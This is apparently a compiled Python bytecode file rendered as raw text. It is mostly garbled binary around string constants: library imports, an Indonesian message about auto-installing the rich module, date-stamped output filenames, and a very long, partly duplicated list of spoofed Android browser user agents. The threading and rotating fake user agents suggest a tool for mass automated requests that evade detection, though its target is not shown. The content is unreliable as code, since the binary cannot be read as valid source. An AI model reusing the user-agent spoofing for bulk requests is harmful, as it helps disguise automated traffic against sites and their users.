o

    �fbY4 �                
   @   s�  d dl Z d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dl	Z	zd dl
Z
W n' eyU   e�d� e�
d� zd dl
Z
W n
 eyR   ed� Y nw Y nw d dlmZ d dlmZ d dlmZ d dlmZ d d	lmZ d d
lmZ d dlZd dl
m Z! d dl"m#Z$ d d
l%m&Z' dgZ(dgZ)g d�Z*g g d d d g g g g g g g g f
\
Z+Z,a-a.a/Z0Z1Z2Z3Z4Z5Z6Z7dZ8dZ9dZ8dZ:dZ;dZ<dZ=dZ>dZ?dZ:dZ@dZ8dZAdZBdZCdZDdZEdZFdZGd ZHd!d"iZId#d$d%d&d'd(d)d*d+d,d-d.d/�ZJd#d$d%d&d'd(d)d*d+d,d-d.d0�ZKd1ZLd2ZMd3ZNd4ZOd5\ZPZQZRZSd6\ZTZUZVZWd7\ZXZYZZd8Z[d9Z\ej�]� j^Z_eJe`ej�]� ja� Zbej�]� jcZdd:e`e_� d; e`eb� d; e`ed� d< Zed=e`e_� d; e`eb� d; e`ed� d< Zfd>d?� Zgd@dA� ZhdBdC� ZidDdE� Zjej�  dFdG� ZkdHdI� ZldJdK� ZmdLdM� ZndNdO� ZodPdQ� ZpdRdS� ZqdTdU� ZrdVdW� ZsdXdY� ZtdZd[� Zud\d]� Zvd^d_� Zwd`da� Zxeydbk�r�ze�zdc� W n   Y ze�zdd� W n   Y ek�  dS dS )e�    Nzpip install rich�   zKTidak Dapat Menginstall Module rich, Coba Install Manual (pip install rich))�Table)�Console)�
BeautifulSoup)�ThreadPoolExecutor)�Group)�Panel)�print)�Markdown)�Columnsz�Mozilla/5.0 (Linux; Android 9; VKY-L09; HMSCore 6.3.0.331; GMSCore 22.06.18) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.36z{Mozilla/5.0 (Linux; Android 10; TECNO KD7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36(
  z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.0 Chrome/83.0.4103.106 Safari/537.36zzMozilla/5.0 (Linux; Android 11; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36u    Mozilla/5.0 (Linux; Android 1…z�[18.36, 15/3/2022] AOREC: Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Mobile Safari/537.36z~Mozilla/5.0 (Linux; Android 11; en-au; SCV45) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; en-au; SC-04L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N980F/N980FXXU1DUB5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N/KSU1FUCD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-M625F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-G988B/G988BXXU7DUC7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;  SAMSUNG SM-A8050) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG IN2020) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zMozilla/5.0 (Linux; Android 10; en-au; SC-42A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T597W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-N960F/N960FXXS8FUC4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G988U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600FN/A600FNXXU6CTF2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A515F/A515FXXU2ATB1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN 6/128) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/13.2 Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A013F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-N935S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M205G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J530GM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A530F/A530FXXU4CSC6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T835) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960F/G960FXXS2BRK3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935F/G935FXXS2DRAA) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G920K/KKS3ETJ1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-C9000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P610) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36r
   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A716U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505FM) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J720M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36zyMozilla/5.0 (Linux; Android 10; en-au; Pixel C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Safari/537.36zMozilla/5.0 (Linux; Android 10; en-au; NX659J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-M107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A102U1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0; en-au; SAMSUNG SM-G965F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.1.1; en-au; SAMSUNG SM-G550FY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-N9200) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; FRD-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-T870) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-P615) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N971N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F/N970FXXS6EUA1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N770F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M307F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G977N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G781B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-F700F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; CPH2009) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G980F/G980FXXU3ATFG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G973F/G973FXXS3BSL4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G960F/G960FXXSDFTL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A908N/KSU3CTL3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS6BUA5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A426B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A217F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.99 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A015F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J710F/J710FXXS6CTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J327R6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-J330FN/J330FNXXU3BRL1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXU3BRL8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A530F/A530FXXS3BRH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-J327U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r   r   r   r   r   z�Mozilla/5.0 (Linux; Android 5.1.1; en-au; SAMSUNG SM-J320FN/J320FNXXU0ARE1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r   r   z�Mozilla/5.0 (Linux; Android 11 en-au;; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36r   z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G980F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F/A515FXXU4DUB2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T725) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-S111DL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M105G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J610FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G965N/KSU3FTJ2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-F700U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXS3BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A115M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXS4BTG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-T827V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J260A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A307GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-T585/T585XXS5CSH1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-J610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G925K/KKU3ERG1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 5.0.2; en-au; SAMSUNG SM-P905) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.136 Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M315F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-M215F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G985F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A515F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A505GN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T505) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T307U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M317F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M307FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J400F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A405FN/A405FNXXS3BTI3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A207F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J810F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-J330FN/J330FNXXU4CTH2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G950F/G950FXXSBDUA3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A605FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.93 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.1.0; en-au; SAMSUNG SM-M105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-G960W) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 8.0.0; en-au; SAMSUNG SM-A520F/A520FXXUGCTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-G935W8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-C7000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 7.0; en-au; SAMSUNG SM-A310F/A310FXXS5CTK1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-T805M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 6.0.1; en-au; SAMSUNG SM-G900F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.75 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N9750) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au;SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G988B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36��Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-A405FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 11; en-au; SAMSUNG SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36r   r   r   z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T295) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-T290) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-M205F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-J600GT) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-G398FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A600G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A505FN/A505FNXXS5BTI9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A205FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A202F/A202FXXU3BTK2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105FN/A105FNXXU4BTI2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 10; en-au; SAMSUNG SM-A105F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-G955F/G955FXXU9DTF1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36z�Mozilla/5.0 (Linux; Android 9; en-au; SAMSUNG SM-A705FN/A705FNXXU3ASG6) 